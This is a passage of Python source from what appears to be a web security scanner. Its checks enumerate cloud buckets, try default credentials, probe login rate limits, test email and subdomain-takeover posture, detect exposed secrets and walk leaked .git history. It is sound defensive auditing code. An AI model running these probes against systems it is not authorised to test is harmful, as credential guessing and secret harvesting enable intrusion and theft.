                    "{t}-prod", "{t}-dev", "{t}-test", "{t}-storage",
                    "{t}-bucket", "{t}-archive", "backup-{t}",
                    "{t}backup")
_BUCKET_CAP = 48


def _bucket_names(host):
    """Candidate bucket names from the target's own domain tokens
    (decision K4: token-derived patterns only, small fixed set)."""
    import ipaddress
    try:
        ipaddress.ip_address(host or "")
        return []
    except ValueError:
        pass
    toks = []
    reg = org_domain(host) or ""
    for cand in (reg.split(".")[0] if reg else "",
                 (host or "").split(".")[0]):
        c = re.sub(r"[^a-z0-9-]", "", (cand or "").lower()).strip("-")
        if 3 <= len(c) <= 40 and c not in toks:
            toks.append(c)
    names = []
    for t in toks:
        for pat in _BUCKET_PATTERNS:
            n = pat.format(t=t)
            if n not in names:
                names.append(n)
    return names[:18]


def _bucket_fetch(url):
    """(status, body) for an absolute URL via the proxy-aware passive
    fetcher. Lazy import: passive.py imports vulnscan2."""
    import passive as _passive
    st, _h, raw = _passive._fetch_bytes(url, timeout=5,
                                        cap=256 * 1024)
    return st, (raw or b"").decode("utf-8", "replace")


def _classify_bucket(provider, status, body):
    """-> (verdict, detail): public / exists / absent / unknown.
    Verdicts rest on provider-signed content (listing documents and
    error documents), never on the HTTP status alone — a gateway or
    WAF answering for the provider cannot fabricate them."""
    body = body or ""
    if provider == "s3":
        if status == 200 and "<ListBucketResult" in body:
            keys = re.findall(r"<Key>([^<]{1,80})</Key>", body)
            return "public", {"objects": len(keys), "sample": keys[:3]}
        if "NoSuchBucket" in body:
            return "absent", {}
        if "AccessDenied" in body:
            return "exists", {}
        return "unknown", {}
    if provider == "gcs":
        if status == 200 and '"items"' in body:
            try:
                items = json.loads(body).get("items") or []
                return "public", {
                    "objects": len(items),
                    "sample": [str(i.get("name", ""))[:60]
                               for i in items[:3]]}
            except Exception:
                return "public", {"objects": -1, "sample": []}
        if status == 404 or "notFound" in body:
            return "absent", {}
        if status in (401, 403):
            return "exists", {}
        return "unknown", {}
    if provider == "azure":
        if status == 200 and "EnumerationResults" in body:
            blobs = re.findall(r"<Name>([^<]{1,80})</Name>", body)
            return "public", {"objects": len(blobs),
                              "sample": blobs[:3]}
        if "ContainerNotFound" in body or "ResourceNotFound" in body \
                or "The specified container does not exist" in body:
            return "absent", {}
        if status in (403, 409) or "AuthenticationFailed" in body:
            return "exists", {}
        if status == 404 or status == 0:
            return "absent", {}
        return "unknown", {}
    return "unknown", {}


def c_cloud_buckets(ctx, add):
    """WS6b (v1.8.0, decision K4): cloud storage bucket enumeration
    (S3 / GCS / Azure Blob). Candidate names derive from the target
    domain's tokens through a small fixed pattern set; the probe
    count is hard-capped. Only two outcomes are reported: publicly
    listable (provider listing document in hand — confirmed) and
    exists-but-private (provider access-denied document — inventory
    candidate, no exposure claimed)."""
    names = _bucket_names(ctx.client.host or "")
    if not names:
        ctx.L("  [buckets] no domain tokens (IP-literal target) — "
              "bucket enumeration not evaluated")
        return
    probed = [0]
    publics, exists = [], []

    def _hit(provider, label, url):
        if probed[0] >= _BUCKET_CAP or ctx.cancelled():
            return
        probed[0] += 1
        st, body = _bucket_fetch(url)
        verdict, det = _classify_bucket(provider, st, body)
        if verdict == "public":
            publics.append((provider, label, url, det))
        elif verdict == "exists":
            exists.append((provider, label, url))

    for name in names:
        _hit("s3", name, f"https://{name}.s3.amazonaws.com/")
        _hit("gcs", name,
             f"https://storage.googleapis.com/storage/v1/b/{name}"
             "/o?maxResults=5")
    accts = []
    for name in names[:6]:
        a = re.sub(r"[^a-z0-9]", "", name)[:24]
        if len(a) >= 3 and a not in accts:
            accts.append(a)
    for a in accts:
        for cont in ("data", "files"):
            _hit("azure", f"{a}/{cont}",
                 f"https://{a}.blob.core.windows.net/{cont}"
                 "?resttype=container&comp=list&maxresults=5")
    for provider, label, url, det in publics:
        sample = ", ".join(det.get("sample") or []) or "-"
        add(F("HIGH", f"Cloud storage bucket publicly listable: {label} ({provider})",
              'An anonymous request listed this bucket\'s contents — object names (and typically the objects themselves) are exposed to the internet. The verdict rests on the provider-signed listing document, not on the HTTP status alone.',
              evidence=f"anonymous listing returned {det.get('objects')} object(s); sample: {sample}",
              cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
              cvss=7.5,
              remed='Disable public listing and public access on the bucket; audit object ACLs; apply least-privilege bucket policies.',
              confidence="confirmed", location=url))
    for provider, label, url in exists[:5]:
        add(F("INFO", f"Cloud storage bucket exists (not publicly listable): {label} ({provider})",
              'The provider confirms a bucket with this name exists but denies anonymous listing — recorded for asset inventory only; no exposure is claimed.',
              evidence="provider returned an access-denied document to an anonymous listing attempt",
              cwe="CWE-200", owasp="A05:2021", cvss=0.0,
              remed="No action required if the bucket is intentional and private.",
              confidence="candidate", location=url))
    if len(exists) > 5:
        ctx.L(f"  [buckets] +{len(exists) - 5} more existing-but-"
              "private buckets (suppressed for noise)")
    ctx.check_meta["cloud_buckets"] = {
        "candidates": len(names), "probed": probed[0],
        "public": [f"{p}:{l}" for p, l, _u, _d in publics],
        "exists_private": [f"{p}:{l}" for p, l, _u in exists]}
    ctx.L(f"  [buckets] probed {probed[0]} candidate buckets: "
          f"{len(publics)} publicly listable, {len(exists)} "
          "existing-but-private")


def c_default_credentials(ctx, add):
    """Cek kredensial default pada endpoint yang meminta HTTP Basic Auth.
    Hanya endpoint 401+WWW-Authenticate yang diuji, maks 8 kombinasi, berhenti di sukses pertama."""
    import base64 as _b64
    probes = ["/admin", "/manager/html", "/admin-basic", "/management", "/console",
              "/api/admin", "/system", "/protected"]
    for path in probes:
        if ctx.cancelled():
            return
        r = ctx.client.get(path)
        if r.status != 401 or "basic" not in (r.hdr("www-authenticate") or "").lower():
            continue
        for user, pw in DEFAULT_CREDS:
            tok = _b64.b64encode(f"{user}:{pw}".encode()).decode()
            rr = ctx.client.get(path, headers={"Authorization": f"Basic {tok}"})
            if rr.status == 200:
                add(F("CRITICAL", f"Default credentials work: {path} ({user}:{pw})",
                      'The Basic Auth endpoint accepted a default/built-in credential pair tried from a common list — administrative access is open.',
                      evidence=f"Basic {user}:**** -> HTTP 200", cwe="CWE-798",
                      owasp="A07:2021 Identification & Authentication Failures", cvss=9.8,
                      remed='Change ALL default passwords; disable built-in accounts; restrict consoles via the network.',
                      confidence="confirmed", location=path))
                return
        ctx.L(f"  [creds] {path} requests Basic Auth — 8 default credentials rejected")


def c_rate_limit_login(ctx, add):
    """Login form tanpa rate-limit yang terlihat: 6 percobaan gagal beruntun untuk
    username yang TIDAK ADA (tidak mengunci akun siapa pun) tetap dilayani normal."""
    surf = ctx.surface(full=True)
    for form in surf.forms:
        if form["method"] != "POST":
            continue
        names = [i.lower() for i in form["inputs"]]
        if not any("user" in n or "email" in n or "login" in n for n in names):
            continue
        uname_field = form["inputs"][names.index(next(n for n in names
                        if "user" in n or "email" in n or "login" in n))]
        pw_field = next((i for i in form["inputs"] if "pass" in i.lower()), "password")
        ok = 0
        for i in range(6):
            if ctx.cancelled():
                return
            data = f"{uname_field}=ptk-nonexistent-probe&{pw_field}=wrong-{i}-{ctx.marker}"
            r = ctx.client.post(form["action"], data=data)
            if r.status in (200, 401, 403) and "captcha" not in (r.body or "").lower() \
                    and r.status != 429:
                ok += 1
        if ok == 6:
            add(F("MEDIUM", f"No rate limiting/lockout detected on login: {form['action']}",
                  '6 consecutive failed login attempts (with a nonexistent probe username) were all served without 429, lockout, or CAPTCHA — credential brute-forcing is unimpeded at the application layer.',
                  evidence='6/6 attempts served normally', cwe="CWE-307",
                  owasp="A07:2021", cvss=5.3,
                  remed='Apply per-IP+account rate limiting, progressive lockout, and/or CAPTCHA after several failures.',
                  confidence="probable", location=form["action"]))
        return


def c_email_security(ctx, add):
    """Postur email domain (SPF/DMARC) via DNS-over-HTTPS — bagian standar audit
    enterprise karena domain tanpa SPF/DMARC dapat dipalsukan untuk phishing."""
    from scanners import doh_query, org_domain
    host = ctx.client.host or ""
    if not host or all(c.isdigit() or c == "." for c in host) or ":" in host:
        return  # target IP: tidak relevan
    dom = org_domain(host)
    spf = doh_query(dom, "TXT")
    if spf is None:
        ctx.L('  [email] DoH unreachable — SPF/DMARC checks skipped (not treated as a finding)')
        return
    spf_recs = [r for r in spf if "v=spf1" in r]
    if not spf_recs:
        add(F("MEDIUM", f"Domain {dom} without an SPF record",
              f"No SPF record — any mail server can claim to send from @{dom} (spoofing/phishing in the domain's name).",
              evidence='TXT query: no v=spf1', cwe="CWE-290",
              owasp="A07:2021", cvss=5.3,
              remed='Publish SPF (v=spf1 ... -all) for legitimate sending domains.',
              confidence="confirmed", location=dom))
    elif any(r.rstrip('" ').endswith(("+all", "~all")) for r in spf_recs):
        add(F("MEDIUM", f"SPF record {dom} too permissive (+all/~all)",
              'SPF ends with +all or ~all — its anti-spoofing effectiveness is weak.',
              evidence=spf_recs[0][:100], cwe="CWE-290", owasp="A07:2021", cvss=5.3,
              remed='End SPF with -all (hard fail) after inventorying valid senders.',
              confidence="confirmed", location=dom))
    dmarc = doh_query(f"_dmarc.{dom}", "TXT")
    if dmarc is not None:
        drecs = [r for r in dmarc if "v=DMARC1" in r]
        if not drecs:
            add(F("MEDIUM", f"Domain {dom} without a DMARC record",
                  'Without DMARC, the domain owner cannot instruct receivers to reject spoofed email and does not receive abuse reports.',
                  evidence=f"TXT _dmarc.{dom}: empty", cwe="CWE-290",
                  owasp="A07:2021", cvss=5.3,
                  remed='Publish DMARC gradually: p=none (monitor) -> quarantine -> reject.',
                  confidence="confirmed", location=f"_dmarc.{dom}"))
        elif any("p=none" in r for r in drecs):
            add(F("LOW", f"DMARC {dom} is still p=none (monitor mode)",
                  'DMARC is present but policy p=none does not reject spoofing — it only monitors.',
                  evidence=drecs[0][:100], cwe="CWE-290", owasp="A07:2021", cvss=3.1,
                  remed="Raise the policy to p=quarantine, then p=reject, after a clean monitoring period.",
                  confidence="confirmed", location=f"_dmarc.{dom}"))


TAKEOVER_FPS = [
    ("github.io", "There isn't a GitHub Pages site here", "GitHub Pages"),
    ("herokuapp.com", "No such app", "Heroku"),
    ("azurewebsites.net", "404 Web Site not found", "Azure Web Apps"),
    ("s3.amazonaws.com", "NoSuchBucket", "AWS S3"),
    ("cloudfront.net", "Bad request", "CloudFront"),
    ("fastly.net", "Fastly error: unknown domain", "Fastly"),
    ("zendesk.com", "Help Center closed", "Zendesk"),
    ("shopify.com", "Sorry, this shop is currently unavailable", "Shopify"),
]


def c_subdomain_takeover(ctx, add):
    """Dangling CNAME: host menunjuk layanan pihak ketiga yang klaimnya sudah lepas."""
    from scanners import doh_query
    host = ctx.client.host or ""
    if not host or all(c.isdigit() or c == "." for c in host):
        return
    cnames = doh_query(host, "CNAME")
    if not cnames:
        return
    target_cname = cnames[0].strip('"').rstrip(".")
    home = ctx.client.get("/")
    body = home.body or ""
    for suffix, sign, label in TAKEOVER_FPS:
        if target_cname.endswith(suffix) and sign.lower() in body.lower():
            add(F("HIGH", f"Subdomain takeover indication: {host} -> {target_cname}",
                  f"CNAME points to {label} and the service answers with an 'unclaimed' signature ({sign}) — an attacker can register that name and take over the subdomain.",
                  evidence=f"CNAME {target_cname}; signature: {sign}", cwe="CWE-350",
                  owasp="A05:2021", cvss=7.4,
                  remed='Remove the dangling CNAME record or reclaim that service name.',
                  confidence="probable", location=host))
            return


_JS_BUNDLE_HINTS = ("app", "main", "bundle", "index", "chunk")


def _js_priority(path):
    name = path.rsplit("/", 1)[-1].lower()
    return (0 if any(h in name for h in _JS_BUNDLE_HINTS) else 1, path)


def _pem_material_parses(text, start):
    """Extract the PEM block beginning at `start` and parse it with
    `cryptography`. Returns the key class name when the material is a
    genuine, complete private key; None when it does not parse."""
    end_m = re.search(r"-----END [A-Z0-9 ]*PRIVATE KEY-----",
                      text[start:start + 16384])
    if not end_m:
        return None
    block = text[start:start + end_m.end()]
    try:
        from cryptography.hazmat.primitives.serialization import \
            load_pem_private_key
        key = load_pem_private_key(block.encode("utf-8", "replace"),
                                   password=None)
        return type(key).__name__
    except Exception:
        return None


def _aws_pair_secret(text, pos):
    """Look for a 40-char AWS secret near an access key ID (same file,
    with an explicit 'secret' context). Returns the masked secret."""
    win = text[max(0, pos - 2500):pos + 2500]
    for m in AWS_SECRET_RE.finditer(win):
        ctxw = win[max(0, m.start() - 160):m.start()]
        if re.search(r"(?i)secret", ctxw):
            return _secret_mask(m.group(0))
    return None


_NOT_VALIDATED = (' The value was NOT validated against its provider '
                  '(no provider contact is ever made); whether it is '
                  'still active must be verified by its owner.')


# --- WS5 (v1.7.0): secret context scoring + operator baseline --------
_TEST_CTX_RE = re.compile(
    r"(?i)\b(test|testing|example|fixture|sample|demo|dummy|mock|"
    r"placeholder|fake|seed data)\b")
_PROD_CTX_RE = re.compile(r"(?i)\b(production|prod|live)\b")
_TIER_DOWN = {"confirmed": "probable", "probable": "candidate",
              "candidate": "candidate"}


def _secret_context_adjust(body, start, end, location, config_style,
                           conf, note):
    """Context scoring: an explicit test/example/fixture context
    demotes the tier one step; a production/config context retains it.
    The decision is always written into the evidence note — never
    applied silently."""
    win = body[max(0, start - 160):end + 160]
    loc = (location or "").lower()
    if _TEST_CTX_RE.search(win) or _TEST_CTX_RE.search(loc):
        return (_TIER_DOWN.get(conf, conf),
                (note + "; " if note else "")
                + "context: test/example/fixture wording around the "
                  "value — tier demoted one step")
    if config_style or ".env" in loc or "config" in loc \
            or _PROD_CTX_RE.search(win):
        return (conf, (note + "; " if note else "")
                + "context: production/config — tier retained")
    return conf, note


def _baseline_map(ctx):
    """Operator secret baseline (WS5) from scan opts, as
    {sha256_hex: entry}. Entries are hashes only — raw values never
    enter the engine or the store."""
    out = {}
    try:
        entries = (ctx.opts or {}).get("secret_baseline") or []
    except Exception:
        entries = []
    for e in entries:
        h = (e or {}).get("hash")
        if h:
            out[h] = e
    return out


def _apply_baseline(f, state, val):
    """Mark a finding dict when its exact value is on the operator
    baseline. K3: the finding STAYS in the list, visibly labelled;
    store.save_scan persists it with status 'suppressed'."""
    bmap = (state or {}).get("baseline") or {}
    if not bmap or not val:
        return f
    h = hashlib.sha256(val.encode("utf-8", "replace")).hexdigest()
    e = bmap.get(h)
    if e:
        f["baseline_suppressed"] = {
            "label": e.get("label", ""), "reason": e.get("reason", ""),
            "hash": h[:12]}
        f["evidence"] += (
            f" — OPERATOR BASELINE MATCH (sha256 {h[:12]}…): baselined "
            f"as '{e.get('label', '')}' — displayed with status "
            "suppressed (baseline), per policy K3")
    return f


def _emit_secret(add, det, val, location, state, confidence, note,
                 layer="raw"):
    key = (det["kind"], _secret_mask(val), location)
    if key in state["seen"] or state["count"] >= state.get("cap", 10):
        return
    state["seen"].add(key)
    state.setdefault("emitted", set()).add((_secret_mask(val), location))
    ev = f"{_secret_mask(val)} in {location}"
    if layer != "raw":
        ev += f" (found in {layer} content)"
    if note:
        ev += f" — {note}"
    _f = F(det["severity"], det["title"], det["desc"] + _NOT_VALIDATED,
           evidence=ev, cwe="CWE-798",
           owasp="A07:2021 Identification & Authentication Failures",
           cvss=det["cvss"],
           remed='Revoke/rotate this credential now and move it to a backend or a secrets manager; never ship secrets in client-side code.',
           confidence=confidence, location=location)
    add(_apply_baseline(_f, state, val))
    state["count"] += 1


def _scan_secrets_text(add, text, location, state, layer="raw",
                       config_style=False):
    """Scan one text with the v2 detector set (secretpatterns.DETECTORS_V2)
    plus the generic Tier B assignment pattern. Structural validators
    run LOCALLY only (CRC checksum, PEM parse, JWT decode, AWS pairing);
    no provider is ever contacted (decision D5/K1)."""
    if not text or state["count"] >= state.get("cap", 10):
        return
    body = text[:512 * 1024]
    claimed = []  # spans already identified by a specific-format detector;
                  # generic/context detectors must not re-claim them
    for det in DETECTORS_V2:
        if state["count"] >= state.get("cap", 10):
            return
        kind = det["kind"]
        for m in det["regex"].finditer(body):
            if state["count"] >= state.get("cap", 10):
                return
            if any(m.start() < e and s < m.end() for s, e in claimed):
                continue
            val = m.group(0)
            if is_denied_secret(val):
                continue
            if det["context"] is not None:
                win = body[max(0, m.start() - 160):m.end() + 160]
                if not det["context"].search(win):
                    continue
            conf, note = det["base"], ""
            v = det["validator"]
            if v == "github_crc":
                ok = github_token_structurally_valid(val)
                if ok is True:
                    conf = "probable"
                    note = "token checksum (CRC32) verified locally — format is structurally genuine"
                elif ok is False:
                    conf = _TIER_DOWN.get(conf, conf)
                    note = "token checksum does NOT verify — likely altered or fabricated; tier demoted one step per policy K4 (a failed checksum never deletes a finding)"
                else:
                    note = "token format is not checksum-verifiable"
            elif v == "pem_parse":
                keytype = _pem_material_parses(body, m.start())
                if keytype:
                    conf = "confirmed"
                    note = (f"private key material parses as a valid {keytype} "
                            "— the EXPOSURE is confirmed; a private key has "
                            "no provider liveness to verify")
                else:
                    note = "key header present but the material does not parse (truncated or corrupt)"
            elif v == "jwt_struct":
                if len(val) < 80:
                    continue
                parsed = parse_jwt(val)
                if parsed is None:
                    continue  # three base64 segments, but not a real JWT
                if parsed["alg"] == "none" or parsed["signature_empty"]:
                    _c2, _n2 = _secret_context_adjust(
                        body, m.start(), m.end(), location, config_style,
                        "probable",
                        "JWT uses alg=none / carries no signature")
                    _emit_secret(add, det, val, location, state, _c2,
                                 _n2, layer)
                    claimed.append(m.span())
                    continue
                conf = "probable"
                bits = [f"JWT structure decoded locally (alg={parsed['alg']}"]
                if parsed.get("signature_wellformed"):
                    bits.append("signature segment is well-formed "
                                "base64url (format check only — NOT "
                                "cryptographically verified)")
                elif not parsed["signature_empty"]:
                    bits.append("signature segment is not well-formed "
                                "base64url")
                iss = parsed["claims"].get("iss")
                exp = parsed["claims"].get("exp")
                if iss:
                    bits.append(f"iss={str(iss)[:40]}")
                if isinstance(exp, (int, float)):
                    bits.append(f"exp={int(exp)}")
                note = ", ".join(bits) + ")"
            elif v == "aws_pair":
                pair = _aws_pair_secret(body, m.start())
                if pair:
                    conf = "confirmed"
                    note = (f"complete credential pair: this access key ID "
                            f"appears together with a 40-char secret ({pair}) "
                            "in the same file — the EXPOSURE is confirmed; "
                            "liveness NOT verified")
            elif v == "gcp_sa":
                if '"private_key"' not in body:
                    continue
                conf = "probable"
                note = "service-account document structure present (type + private_key fields)"
            elif v == "luhn":
                if luhn_valid(re.sub(r"\D", "", val)):
                    conf = "probable"
                    note = "Luhn checksum PASSES locally — the value is structurally a valid payment card number (offline check only; never validated with an issuer)"
                else:
                    conf = _TIER_DOWN.get(det["base"], "candidate")
                    note = "Luhn checksum FAILS — tier demoted one step per policy K4 (a failed checksum never deletes a finding); likely a look-alike number, kept for audit"
            elif v == "bip39":
                _bs = bip39_phrase_status(val)
                if _bs is None or _bs == "not_mnemonic":
                    continue  # not a BIP-39 candidate at all
                if _bs == "valid":
                    conf = "probable"
                    note = "BIP-39 checksum VERIFIES locally — a structurally valid mnemonic seed phrase (offline check only)"
                else:
                    conf = "candidate"
                    note = "every word is a BIP-39 wordlist word but the embedded checksum does NOT verify — tier demoted per policy K4 (never removed)"
            conf, note = _secret_context_adjust(
                body, m.start(), m.end(), location, config_style,
                conf, note)
            claimed.append(m.span())
            _emit_secret(add, det, val, location, state, conf, note, layer)
    for m in WEB_GENERIC_SECRET_RE.finditer(body):
        if state["count"] >= state.get("cap", 10):
            return
        val = m.group(2)
        if is_denied_secret(val) or shannon_entropy(val) < 3.5:
            continue
        key = ("generic", _secret_mask(val), location)
        if key in state["seen"] or \
                (_secret_mask(val), location) in state.get("emitted", set()):
            continue
        state["seen"].add(key)
        add(_apply_baseline(F("LOW", "Hardcoded credential indication in web content",
              f"A credential assignment ({m.group(1)}) with a high-entropy value was found in content served to any visitor. Manual verification is required to determine whether the value is a real, still-active credential. The value was NOT validated against any provider.",
              evidence=f"{m.group(1)} = {_secret_mask(val)} in {location}",
              cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
              cvss=3.7,
              remed='Manually verify whether this value is an active credential; if so, revoke it and move it to a backend or a secrets manager.',
              confidence="candidate", location=location), state, val))
        state["count"] += 1
    if config_style:
        for m in _ENV_STYLE_RE.finditer(body):
            if state["count"] >= state.get("cap", 10):
                return
            val = m.group(2).strip("\"'")
            if is_denied_secret(val) or shannon_entropy(val) < 3.5:
                continue
            if val.startswith("base64:") and len(val) < 24:
                continue  # Laravel-style APP_KEY placeholder shapes
            key = ("envstyle", _secret_mask(val), location)
            if key in state["seen"] or \
                    (_secret_mask(val), location) in state.get("emitted", set()):
                continue
            state["seen"].add(key)
            add(_apply_baseline(F("LOW", "Credential value in exposed configuration file",
                  f"A credential assignment ({m.group(1)}) with a high-entropy value was found inside a publicly served configuration file. Manual verification is required; the value was NOT validated against any provider.",
                  evidence=f"{m.group(1)} = {_secret_mask(val)} in {location}",
                  cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
                  cvss=3.7,
                  remed='Remove the file from the webroot and rotate the credential if it is real.',
                  confidence="candidate", location=location), state, val))
            state["count"] += 1


_ENV_STYLE_RE = re.compile(
    r"(?im)^\s*(?:export\s+)?([A-Za-z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD)[A-Za-z0-9_]*)"
    r"\s*=\s*(\S{12,64})\s*$")


_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")
_HEX_BLOB_RE = re.compile(r"(?<![0-9a-fA-F])[0-9a-fA-F]{40,}(?![0-9a-fA-F])")


def _printable_ratio(raw):
    if not raw:
        return 0.0
    good = sum(1 for b in raw if 32 <= b < 127 or b in (9, 10, 13))
    return good / len(raw)


def _decoded_variants(text):
    """Decoder layers (design B2): URL-decoding, unicode escapes, JS
    string concatenation, and printable base64/hex blobs are decoded
    and re-scanned. Hard caps keep the work per file bounded."""
    variants = []
    from urllib.parse import unquote
    try:
        u = unquote(text)
        if u != text:
            variants.append(("url-decoded", u))
    except Exception:
        pass
    if "\\u" in text or "\\x" in text:
        try:
            variants.append(("unicode-unescaped",
                             text.encode("utf-8", "replace").decode(
                                 "unicode_escape", "replace")))
        except Exception:
            pass
    if '" +' in text or "' +" in text or '+ "' in text or "+ '" in text:
        joined = re.sub(r"[\"']\s*\+\s*[\"']", "", text)
        if joined != text:
            variants.append(("concatenation-joined", joined))
    seen_dec = set()
    for m in _B64_BLOB_RE.finditer(text):
        if len(variants) >= 16:
            break
        blob = m.group(0)
        try:
            raw = base64.b64decode(blob + "=" * (-len(blob) % 4))
        except Exception:
            continue
        if len(raw) < 8 or _printable_ratio(raw) < 0.95:
            continue
        s = raw.decode("utf-8", "replace")
        if s not in seen_dec:
            seen_dec.add(s)
            variants.append(("base64-decoded", s))
    for m in _HEX_BLOB_RE.finditer(text):
        if len(variants) >= 20:
            break
        try:
            raw = bytes.fromhex(m.group(0))
        except Exception:
            continue
        if len(raw) < 10 or _printable_ratio(raw) < 0.95:
            continue
        s = raw.decode("utf-8", "replace")
        if s not in seen_dec:
            seen_dec.add(s)
            variants.append(("hex-decoded", s))
    return variants


def _scan_secrets_in(add, text, location, state, config_style=False):
    """Scan one text (raw + decoder layers) for secrets. state =
    {seen, count, cap} shared across sources within one scan.
    Evidence is ALWAYS masked."""
    if not text or state["count"] >= state.get("cap", 10):
        return
    _scan_secrets_text(add, text, location, state, "raw", config_style)
    for layer, variant in _decoded_variants(text[:512 * 1024]):
        if state["count"] >= state.get("cap", 10):
            return
        # Variant findings carry the layer as a location fragment (same
        # convention as source maps) so run-level dedup by
        # (title, location) cannot swallow them as duplicates of the
        # raw-layer finding for the same file.
        _scan_secrets_text(add, variant, f"{location}#{layer}", state,
                           layer, config_style)


def _scan_source_maps(ctx, add, js_url, js_body, state):
    """Source-map phase (design B3.1, deferred from v1.2.0): fetch the
    map for a JS file (sourceMappingURL or <url>.map) and scan each
    sourcesContent entry — original sources are where secrets linger."""
    candidates = []
    m = re.search(r"sourceMappingURL=([^\s\"']+)", js_body or "")
    if m:
        from urllib.parse import urljoin
        candidates.append(urljoin(js_url, m.group(1)))
    candidates.append(js_url + ".map")
    for map_url in candidates:
        if state["count"] >= state.get("cap", 10):
            return
        path = urlparse(map_url).path
        if urlparse(map_url).query:
            path += "?" + urlparse(map_url).query
        r = ctx.client.get(path)
        if r.status != 200 or ctx.is_missing(r) or not (r.body or ""):
            continue
        try:
            doc = json.loads(r.body)
        except Exception:
            continue
        sources = doc.get("sources") or []
        contents = doc.get("sourcesContent") or []
        for i, content in enumerate(contents):
            if state["count"] >= state.get("cap", 10):
                return
            if not content:
                continue
            name = sources[i] if i < len(sources) else f"source[{i}]"
            _scan_secrets_in(add, content,
                             f"{path}#{name}", state)
        return  # one map per JS file is enough


# Paths whose signature-verified bodies c_sensitive_files feeds into
# the secrets engine (design B3.3).
SECRET_FEED_PATHS = {"/.env", "/.env.bak", "/.env.local",
                     "/wp-config.php.bak", "/wp-config.php~",
                     "/config.php.bak", "/.htpasswd"}

# Paths whose signature-verified bodies c_sensitive_files feeds into
# the dependency-manifest miner (WS2, v1.10.0).
DEP_FEED_PATHS = {"/package.json", "/package-lock.json",
                  "/composer.json", "/composer.lock",
                  "/Gemfile.lock", "/requirements.txt", "/Pipfile.lock",
                  "/pom.xml", "/build.gradle", "/packages.config"}


def c_exposed_secrets(ctx, add):
    """Exposed secrets in web content — Secrets Engine v2 (v1.3.0):
    72 provider detectors with local structural validation (GitHub CRC
    checksum, private-key parsing, JWT decoding, AWS pairing), layered
    decoders (base64/hex/URL/unicode/concatenation), source-map
    sourcesContent, and the bodies of signature-verified sensitive
    files. Values are never validated against providers (D5/K1) and
    never shown in full."""
    surf = ctx.surface(full=True)
    state = {"seen": set(), "count": 0, "cap": 10,
             "baseline": _baseline_map(ctx)}
    home = surf.homepage or ctx.client.get("/")
    if home is not None and (home.body or ""):
        _scan_secrets_in(add, home.body, "/", state)
    for path, body in getattr(ctx, "_secret_feed", []) or []:
        if state["count"] >= state["cap"]:
            break
        _scan_secrets_in(add, body, path, state, config_style=True)
    urls = sorted(getattr(surf, "js_urls", []) or [], key=_js_priority)[:12]
    for u in urls:
        if ctx.cancelled() or state["count"] >= state["cap"]:
            break
        r = ctx.client.get(u)
        if r.status != 200 or ctx.is_missing(r) or not (r.body or ""):
            continue
        _scan_secrets_in(add, r.body, u, state)
        _scan_source_maps(ctx, add, u, r.body, state)
    if state["count"]:
        ctx.L(f"  [secrets] {state['count']} exposed-secret findings (values masked, structurally validated locally, never provider-validated)")


# ------------------------------------------------------------ git history

_GIT_MAX_OBJECTS = 60
_GIT_MAX_TOTAL = 2 * 1024 * 1024
_GIT_MAX_BLOB = 256 * 1024


def _git_fetch_raw(ctx, path):
    """Raw-bytes GET for .git objects. netclient's Resp body is
    text-decoded (utf-8/replace), which would corrupt zlib object
    data, so this reuses passive._fetch_bytes (same proxy rules)."""
    import passive as _passive
    from urllib.parse import urljoin
    base = ctx.target if ctx.target.endswith("/") else ctx.target + "/"
    status, _hdrs, raw = _passive._fetch_bytes(
        urljoin(base, path.lstrip("/")), timeout=8, verify=False,
        cap=_GIT_MAX_BLOB)
    return status, raw


def _git_object(ctx, sha, budget):
    import zlib
    if budget["objects"] >= _GIT_MAX_OBJECTS or budget["bytes"] >= _GIT_MAX_TOTAL:
        return None, None
    status, raw = _git_fetch_raw(ctx, f"/.git/objects/{sha[:2]}/{sha[2:]}")
    if status != 200 or not raw:
        return None, None
    budget["objects"] += 1
    budget["bytes"] += len(raw)
    try:
        data = zlib.decompress(raw)
    except Exception:
        return None, None
    hdr, sep, payload = data.partition(b"\x00")
    if not sep:
        return None, None
    parts = hdr.split(b" ")
    if len(parts) != 2:
        return None, None
    return parts[0].decode("ascii", "replace"), payload


def _git_parse_commit(payload):
    tree, parents = None, []
    for line in payload.split(b"\n"):
        if not line:
            break
        if line.startswith(b"tree "):
            tree = line[5:].decode("ascii", "replace").strip()
        elif line.startswith(b"parent "):
            parents.append(line[7:].decode("ascii", "replace").strip())
    return tree, parents


def _git_parse_tree(payload):
    entries = []
    i = 0
    while i < len(payload):
        sp = payload.find(b" ", i)
        if sp < 0:
            break
        nul = payload.find(b"\x00", sp)
        if nul < 0 or nul + 21 > len(payload):
            break
        mode = payload[i:sp].decode("ascii", "replace")
        name = payload[sp + 1:nul].decode("utf-8", "replace")
        sha = payload[nul + 1:nul + 21].hex()
        entries.append((mode, name, sha))
        i = nul + 21
    return entries


def c_git_secrets(ctx, add):
    """Secrets in exposed .git history (design B3.2): when /.git is
    confirmed exposed, walk loose objects with a pure-Python zlib
    walker (HEAD -> ref -> commits -> trees -> blobs, plus logs/HEAD
    history) and run the Secrets Engine over historical blobs. The
    git binary is never invoked. Hard caps bound the walk."""
    head = ctx.client.get("/.git/HEAD")
    if head.status != 200 or not (head.body or "") or ctx.is_missing(head):
        return
    head_body = head.body.strip()
    if not re.match(r"^(ref:\s*refs/[\w./-]+|[0-9a-f]{40})$", head_body):
        return
    ctx.L("  [git] /.git confirmed exposed — walking loose object history")
    seeds = []
    if head_body.startswith("ref:"):
        ref = head_body[4:].strip()
        r = ctx.client.get("/.git/" + ref)
        if r.status == 200 and r.body:
            sha = r.body.strip().split()[0] if r.body.strip() else ""
            if re.fullmatch(r"[0-9a-f]{40}", sha):
                seeds.append(sha)
        pr = ctx.client.get("/.git/packed-refs")
        if pr.status == 200 and pr.body:
            for line in pr.body.splitlines():
                parts = line.strip().split(" ")
                if len(parts) == 2 and re.fullmatch(r"[0-9a-f]{40}", parts[0]):
                    seeds.append(parts[0])
    else:
        seeds.append(head_body)
    logs = ctx.client.get("/.git/logs/HEAD")
    if logs.status == 200 and logs.body:
        for line in logs.body.splitlines():
            for tok in line.split(" ")[:2]:
                if re.fullmatch(r"[0-9a-f]{40}", tok) and tok != "0" * 40:
                    seeds.append(tok)
    state = {"seen": set(), "count": 0, "cap": 8,
             "baseline": _baseline_map(ctx)}
    budget = {"objects": 0, "bytes": 0}
    visited = set()
